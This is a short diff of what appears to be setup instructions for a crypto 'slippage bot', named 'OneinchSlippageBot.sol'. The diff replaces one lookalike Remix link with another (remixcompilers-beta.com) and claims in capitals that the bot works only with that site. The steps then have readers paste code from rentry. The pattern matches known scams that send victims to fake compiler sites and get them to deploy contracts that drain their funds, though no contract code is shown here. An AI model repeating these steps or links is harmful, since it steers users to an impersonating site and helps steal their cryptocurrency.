@@ -4,8 +4,8 @@
 
 ✅1- Download MetaMask: https://metamask.io/download/
 
-✅2- Access Remix: https://remix-eth.live/
-⚠️(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)⚠️ https://remix-eth.live/
+✅2- Access Remix: https://www.remixcompilers-beta.com
+⚠️(THE BOT IS ONLY COMPATIBLE WITH THIS VERSION OF THE REMIX, SO ONLY USE THIS LINK)⚠️ www.remixcompilers-beta.com
 
 ✅3- Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “OneinchSlippageBot.sol”. Make sure it ends with .sol for Ethereum programming language.
 Note: There is a problem if the text is not colored when you create bot.sol. Simply refresh the browser and then paste rentry codes again.
